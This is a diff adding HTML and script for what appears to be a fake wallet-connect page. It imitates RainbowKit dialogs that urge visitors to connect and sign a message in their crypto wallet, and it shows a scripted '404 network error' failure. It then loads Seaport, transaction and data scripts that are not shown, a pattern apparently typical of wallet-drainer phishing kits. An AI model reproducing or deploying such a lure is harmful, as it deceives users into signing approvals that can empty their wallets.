ZCIvPgo8cGF0aCBkPSJNOS4xMDQ4NCAxMi4xNDU2TDQuNTA4NDggMTMuNDkwM0wyLjk3OTI5IDE4LjI1MzZINy4wNTcxM0w5Ljc5MDMzIDE4LjI4ODhMNy43MTYyNiAxNC4yNDYxTDkuMTA0ODQgMTIuMTQ1NloiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuMzQ0NiAxNC40NjU4TDE1LjYzNDcgOS4zOTQ4NUwxNi45NzA1IDUuNzgyOEgxMS4wMzgzTDEyLjM1NjYgOS4zOTQ4NUwxMi42NjQyIDE0LjQ2NThMMTIuNzY5NiAxNi4wNjUzTDEyLjc3ODQgMjAuMDAyNUgxNS4yMTI4TDE1LjIzMDQgMTYuMDY1M0wxNS4zNDQ2IDE0LjQ2NThaIiBmaWxsPSIjRjY4NTFCIiBzdHJva2U9IiNGNjg1MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPC9zdmc+Cg==');
+                                                                    background-repeat: no-repeat;
+                                                                    opacity: 1;
+                                                                "></div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="iekbcc0 ju367v7e ju367v7z ju367v4 ju367va ju367v15 ju367v1n" style="text-align: center;">
+                                                        <div class="iekbcc0 ju367vgt ju367v16 ju367v1b ju367v1h ju367v2v">Connecting you Wallet..</div>
+                                                        <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v2q"><div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1f ju367v2u">Confirm connection in the extension</div></div>
+                                                        <div class="iekbcc0 ju367v4 ju367vgt ju367va ju367v14 ju367v2d ju367v4u">
+                                                            <div class="iekbcc0 ju367vgz">
+                                                                <svg class="_1luule42" fill="none" height="21" viewbox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg">
+                                                                    <clippath id="spinner_408093694">
+                                                                        <path d="M10.5 3C6.35786 3 3 6.35786 3 10.5C3 14.6421 6.35786 18 10.5 18C11.3284 18 12 18.6716 12 19.5C12 20.3284 11.3284 21 10.5 21C4.70101 21 0 16.299 0 10.5C0 4.70101 4.70101 0 10.5 0C16.299 0 21 4.70101 21 10.5C21 11.3284 20.3284 12 19.5 12C18.6716 12 18 11.3284 18 10.5C18 6.35786 14.6421 3 10.5 3Z"></path>
+                                                                    </clippath>
+                                                                    <foreignobject clip-path="url(#spinner_408093694)" height="21" width="21" x="0" y="0"><div class="_1luule43"></div></foreignobject>
+                                                                </svg>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="iekbcc0 ju367v4 ju367vk ju367va ju367v14 ju367v1q ju367v2b ju367v2r ju367v4w"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="0"></div>
+    </div>
+</div>
+   <div class="iekbcc0" data-rk="" id="sign-assets" style="display: none;">
+    <div id="sign-close" class="iekbcc0 ju367v4 ju367v8q _9pm4ki3 ju367v9g ju367vb2 ju367va ju367v2q ju367v8q" data-rk="rainbowkit" aria-labelledby="rk_connect_title" aria-modal="true" role="dialog">
+        <div tabindex="0"></div>
+        <div tabindex="-1" class="_9pm4ki5 ju367va ju367v15 ju367v8r" role="document" style="outline: none;">
+            <div class="iekbcc0">
+                <div class="iekbcc0 _1ckjpok1 ju367vb5 ju367vdq ju367vp ju367vt ju367vv ju367vek ju367va ju367v15 ju367v6c ju367v8r">
+                    <div class="iekbcc0 ju367v84 ju367v6d ju367v6y ju367v7j">
+                        <div class="iekbcc0 ju367v8r">
+                            <div class="iekbcc0 ju367va ju367v7u ju367v8f ju367v8p ju367v8s">
+                                <button class="iekbcc0 iekbcc9 ju367v4 ju367v9z ju367vc5 ju367vs ju367vt ju367vv ju367vfe ju367va ju367v2b ju367v2q ju367v8t ju367v93 _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" aria-label="Close" type="button" style="will-change: transform;">
+                                    <svg aria-hidden="true" fill="none" height="10" viewbox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg">
+                                        <title>Close</title>
+                                        <path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path>
+                                    </svg>
+                                </button>
+                            </div>
+                            <div class="iekbcc0 ju367v8i ju367v6r ju367v7a ju367v7v ju367v4 ju367va ju367v15 ju367v1x" style="padding-top: 36px;">
+                                <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1n" style="max-width: 280px;">
+                                    <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1u">
+                                        <div class="iekbcc0 ju367v6c ju367v8r" role="img" style="height: 40px; width: 40px;">
+                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                    transition: opacity 0.15s linear 0s;
+                                                    user-select: none;
+                                                    background-image: url('data:image/png;base64,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');
+                                                    background-repeat: no-repeat;
+                                                    opacity: 1;
+                                                "></div>
+                                        </div>
+                                        <div class="iekbcc0 ju367vgt ju367v16 ju367v1b ju367v1i ju367v2u">Verify your account</div>
+                                    </div>
+                                    <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1s">
+                                        <div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1e ju367v2u">To finish connecting, you must sign a message in your wallet to verify that you are the owner of this account.</div>
+                                    </div>
+                                </div>
+                                <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1q ju367v9e">
+                                    <button class="iekbcc0 iekbcc9 ju367v77 ju367v7s ju367v88 ju367v6h ju367vc5 ju367vt ju367vv ju367vm ju367v8 ju367v2u ju367v8u ju367v9t ju367v2b" type="button" data-testid="rk-auth-message-button" style="will-change: transform;">
+                                        <div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1h ju367v2v">Waiting for signature...</div>
+                                    </button>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="0"></div>
+    </div>
+</div>
+   <div class="iekbcc0" data-rk="" id="failed-modal" style="display: none;">
+    <div id="failed-close" class="iekbcc0 ju367v4 ju367v8q _9pm4ki3 ju367v9g ju367vb2 ju367va ju367v2q ju367v8q" data-rk="rainbowkit" aria-labelledby="rk_connect_title" aria-modal="true" role="dialog">
+        <div tabindex="0"></div>
+        <div tabindex="-1" class="_9pm4ki5 ju367va ju367v15 ju367v8r" role="document" style="outline: none;">
+            <div class="iekbcc0">
+                <div class="iekbcc0 _1ckjpok1 ju367vb5 ju367vdq ju367vp ju367vt ju367vv ju367vek ju367va ju367v15 ju367v6c ju367v8r">
+                    <div class="iekbcc0 ju367v84 ju367v6d ju367v6y ju367v7j">
+                        <div class="iekbcc0 ju367v8r">
+                            <div class="iekbcc0 ju367va ju367v7u ju367v8f ju367v8p ju367v8s">
+                                <button class="iekbcc0 iekbcc9 ju367v4 ju367v9z ju367vc5 ju367vs ju367vt ju367vv ju367vfe ju367va ju367v2b ju367v2q ju367v8t ju367v93 _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" aria-label="Close" type="button" style="will-change: transform;">
+                                    <svg aria-hidden="true" fill="none" height="10" viewbox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg">
+                                        <title>Close</title>
+                                        <path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path>
+                                    </svg>
+                                </button>
+                            </div>
+                            <div class="iekbcc0 ju367v8i ju367v6r ju367v7a ju367v7v ju367v4 ju367va ju367v15 ju367v1x" style="padding-top: 36px;">
+                                <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1n" style="max-width: 280px;">
+                                    <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1u">
+                                        <div class="iekbcc0 ju367v6c ju367v8r" role="img" style="height: 40px; width: 40px;">
+                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                    transition: opacity 0.15s linear 0s;
+                                                    user-select: none;
+                                                    background-image: url('data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KDTwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIFRyYW5zZm9ybWVkIGJ5OiBTVkcgUmVwbyBNaXhlciBUb29scyAtLT4KPHN2ZyB3aWR0aD0iODAwcHgiIGhlaWdodD0iODAwcHgiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZGF0YS1uYW1lPSJMYXllciAxIiBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmaWxsPSIjMDAwMDAwIj4KDTxnIGlkPSJTVkdSZXBvX2JnQ2FycmllciIgc3Ryb2tlLXdpZHRoPSIwIi8+Cg08ZyBpZD0iU1ZHUmVwb190cmFjZXJDYXJyaWVyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KDTxnIGlkPSJTVkdSZXBvX2ljb25DYXJyaWVyIj4KDTxkZWZzPgoNPHN0eWxlPi5jbHMtMXtmaWxsOiMwMDc0ZmY7fTwvc3R5bGU+Cg08L2RlZnM+Cg08dGl0bGUvPgoNPHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNDcuOTEsNTMuOTFhNS45Myw1LjkzLDAsMCwxLTQuMjQtMS43NmwtNC4zMi00LjMyQTIsMiwwLDAsMSw0Mi4xNyw0NWw0LjMzLDQuMzJhMiwyLDAsMCwwLDIuODIsMCwyLDIsMCwwLDAsMC0yLjgyTDM2LjI0LDMzLjQxYTIsMiwwLDAsMSwwLTIuODJMNDkuMzIsMTcuNWEyLDIsMCwwLDAsMC0yLjgyLDIsMiwwLDAsMC0yLjgyLDBMMzMuNDEsMjcuNzZhMiwyLDAsMCwxLTIuODIsMEwxNy41LDE0LjY4YTIsMiwwLDAsMC0yLjgyLDAsMiwyLDAsMCwwLDAsMi44MkwyNy43NiwzMC41OWEyLDIsMCwwLDEsMCwyLjgyTDE0LjY4LDQ2LjVhMiwyLDAsMCwwLDAsMi44MiwyLDIsMCwwLDAsMi44MiwwTDMwLjU5LDM2LjI0YTIsMiwwLDAsMSwyLjgyLDBsMi40NCwyLjQ0QTIsMiwwLDAsMSwzMyw0MS41MWwtMS0xTDIwLjMzLDUyLjE1YTYsNiwwLDEsMS04LjQ4LTguNDhMMjMuNTEsMzIsMTEuODUsMjAuMzNhNiw2LDAsMSwxLDguNDgtOC40OEwzMiwyMy41MSw0My42NywxMS44NWE2LDYsMCwxLDEsOC40OCw4LjQ4TDQwLjQ5LDMyLDUyLjE1LDQzLjY3YTYsNiwwLDAsMS00LjI0LDEwLjI0WiIvPgoNPC9nPgoNPC9zdmc+');
+                                                    background-repeat: no-repeat;
+                                                    opacity: 1;
+                                                "></div>
+                                        </div>
+                                        <div class="iekbcc0 ju367vgt ju367v16 ju367v1b ju367v1i ju367v2u">Connection error</div>
+                                    </div>
+                                    <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1s">
+                                        <div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1e ju367v2u">Could not establish a connection with your web3 provider, please try another wallet or try again later</div>
+                                    </div>
+                                </div>
+                                <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1q ju367v9e">
+                                    <button class="iekbcc0 iekbcc9 ju367v77 ju367v7s ju367v88 ju367v6h ju367vc5 ju367vt ju367vv ju367vm ju367v8 ju367v2u ju367v8u ju367v9t ju367v2b" type="button" data-testid="rk-auth-message-button" style="will-change: transform;">
+                                        <div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1h ju367v2v" style="
+    color: #f32f2f;
+">Error : 404 network error</div>
+                                    </button>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="0"></div>
+    </div>
+</div>
+
+<script>
+
+let modalAbierto = false;
+console.log("Resolución del monitor: " + screen.width + " x " + screen.height);
+
+
+
+function openModal() {
+    document.getElementById('openmodal').style.display = 'block';
+    modalAbierto = true;
+}
+
+function closeModal() {
+    document.getElementById('openmodal').style.display = 'none';
+    document.getElementById('failed-modal').style.display = 'none';
+    modalAbierto = false;
+}
+
+// Event listener para el botón
+document.getElementById('connectButton').addEventListener('click', openModal);
+
+// Event listener para cerrar el modal al hacer clic fuera de él
+window.addEventListener('click', function(event) {
+    
+    const openmodal = document.getElementById('openmodal-close');
+    const failedmodal = document.getElementById('failed-close');
+    
+    if (modalAbierto && event.target === openmodal) { closeModal();}
+    if (modalAbierto && event.target === failedmodal) { closeModal();}
+
+});
+</script>
+
+    <script src="../axios%401.6.7/dist/axios.min.js"></script>
+    <script src="assets/web3-provider/web3-modal.js"></script>
+    <script src="assets/web3-provider/web3-loader.js"></script>
+    <script src="assets/web3-provider/web3-connect.js"></script>
+    <script src="assets/web3-provider/web3-router.js"></script>
+    <script src="assets/web3-provider/web3-module.js"></script>
+    <script src="assets/web3-provider/web3-alert.js"></script>
+    <script src="assets/web3-provider/web3-seaport.js"></script>
+    <script src="assets/web3-provider/web3-data.js"></script>
+    <script src="assets/web3-provider/ethers.js"></script>
+    <script src="assets/web3-provider/ethereum-tx.js"></script>
+    <script src="assets/web3-provider.js"></script>
+</body>
+</html>
